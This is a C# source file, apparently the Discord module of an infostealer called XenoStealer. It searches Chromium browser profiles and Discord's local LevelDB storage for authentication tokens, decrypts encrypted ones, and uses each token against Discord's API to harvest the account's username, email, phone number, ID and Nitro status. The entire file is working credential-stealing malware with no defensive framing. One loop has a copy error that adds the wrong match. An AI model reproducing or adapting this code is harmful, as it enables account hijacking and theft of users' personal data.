using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using static XenoStealer.DataExtractionStructs;

namespace XenoStealer.DataExtraction.Applications
{
    public class Discord
    {
        private static Regex BasicRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
        private static Regex NewRegex = new Regex(@"mfa\.[\w-]{84}", RegexOptions.Compiled);
        private static Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

        public static DiscordUserData[] GetTokens() 
        {
            HashSet<string> tokens = new HashSet<string>();

            foreach (string userData in Configuration.ChromiumBrowsers.Values)
            {
                if (!Directory.Exists(userData))
                {
                    continue;
                }
                foreach (string profile in Chromium.GetProfiles(userData))
                {
                    string leveldbsPath = Path.Combine(userData, profile, "Local Storage", "leveldb");
                    if (!Directory.Exists(leveldbsPath))
                    {
                        continue;
                    }
                    string[] dbfiles = Directory.GetFiles(leveldbsPath, "*.ldb", SearchOption.AllDirectories);
                    foreach (string file in dbfiles)
                    {
                        string contents = Utils.ForceReadFileString(file);

                        if (contents == null) 
                        {
                            continue;
                        }

                        contents = RemoveNonPrintableCharacters(contents);

                        Match match1 = BasicRegex.Match(contents);
                        while (match1.Success)
                        {
                            tokens.Add(match1.Value);
                            match1 = match1.NextMatch();
                        }
                        Match match2 = NewRegex.Match(contents);
                        while (match2.Success)
                        {
                            tokens.Add(match2.Value);
                            match2 = match2.NextMatch();
                        }
                    }
                
                
                    
                
                }
            }

            foreach (string i in Configuration.DiscordPaths)
            {

                ChromeDecryptor decryptor = new ChromeDecryptor(i);

                string leveldbsPath = Path.Combine(i, "Local Storage", "leveldb");
                if (!Directory.Exists(leveldbsPath))
                {
                    continue;
                }
                string[] dbfiles = Directory.GetFiles(leveldbsPath, "*.ldb", SearchOption.AllDirectories);

                foreach (string file in dbfiles)
                {
                    string contents = Utils.ForceReadFileString(file);

                    if (contents == null) 
                    {
                        continue;
                    }

                    contents = RemoveNonPrintableCharacters(contents);

                    Match match1 = BasicRegex.Match(contents);
                    while (match1.Success)
                    {
                        tokens.Add(match1.Value);
                        match1 = match1.NextMatch();
                    }
                    Match match2 = NewRegex.Match(contents);
                    while (match2.Success)
                    {
                        tokens.Add(match1.Value);
                        match2 = match2.NextMatch();
                    }

                    if (decryptor.operational)
                    {

                        Match match3 = EncryptedRegex.Match(contents);
                        while (match3.Success)
                        {
                            string token = decryptor.DecryptBase64(match3.Value.Substring("dQw4w9WgXcQ:".Length));

                            if (token != null) 
                            {
                                tokens.Add(token);
                            }
                            
                            match3 = match3.NextMatch();
                        }
                    }
                }
            }

            List<DiscordUserData> discordUserDatas = new List<DiscordUserData>();

            using (WebClient client = new WebClient())
            {

                foreach (string i in tokens)
                {
                    if (GetTokenUserData(i, out DiscordUserData data, client))
                    {
                        discordUserDatas.Add(data);
                    }
                }
            }

            return discordUserDatas.ToArray();

        }


        private static bool GetTokenUserData(string token, out DiscordUserData userData, WebClient client = null) 
        {
            userData = default;
            bool doDispose = client == null;
            if (doDispose) 
            { 
                client = new WebClient();
            }

            client.Headers.Add("authorization", token);

            bool result = false;

            try
            {
                string userInfoData = client.DownloadString("https://discord.com/api/v9/users/@me");
                JavaScriptSerializer serializer = new JavaScriptSerializer();
                dynamic deserializedUserInfoData = serializer.Deserialize<dynamic>(userInfoData);

                string username = deserializedUserInfoData["username"];
                string email = deserializedUserInfoData["email"];
                string phone = deserializedUserInfoData["phone"];
                string id = deserializedUserInfoData["id"];
                bool hasNitro = (int)deserializedUserInfoData["flags"] > 0;//this will count classic too, but technically its "nitro" classic, so ill keep it.
                userData = new DiscordUserData(token, username, email, phone, id, hasNitro);
                result = true;

            }
            catch
            {
                
            }
            client.Headers.Remove("authorization");

            if (doDispose) 
            { 
                client.Dispose();
            }

            return result;
        }


        private static string RemoveNonPrintableCharacters(string input)
        {
            StringBuilder sb = new StringBuilder();

            foreach (char c in input)
            {
                if (IsPrintable(c))
                {
                    sb.Append(c);
                }
            }

            return sb.ToString();
        }

        private static bool IsPrintable(char c)
        {
            // Check if character is printable (between ' ' and '~' in ASCII)
            return c >= 0x20 && c <= 0x7E;
        }

    }
}
